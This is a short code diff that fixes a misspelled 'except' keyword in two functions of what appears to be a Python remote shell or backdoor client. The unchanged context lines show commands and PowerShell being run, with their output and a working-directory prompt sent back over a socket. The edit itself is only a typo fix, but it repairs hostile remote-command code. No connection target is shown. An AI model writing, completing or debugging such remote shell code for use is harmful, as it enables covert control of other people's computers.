@@ -25,7 +25,7 @@ def cmd(s,data):
               output=str(output,"utf-8")
               string3=str.encode(output+os.getcwd()+'>',"utf-8")
               s.sendall(string3)
-     expect:
+     except:
          print("An Erorr is Occured")
          s.close()
          sys.exit()
@@ -46,7 +46,7 @@ def powershell(s,data):
                output=p.stdout.read()+p.stderr.read()
                string3=str.encode(output+os.getcwd()+'>',"utf-8")
                s.sendall(string3)
-     expect:
+     except:
           print("An Error is occured")
           s.close()
           sys.exit()
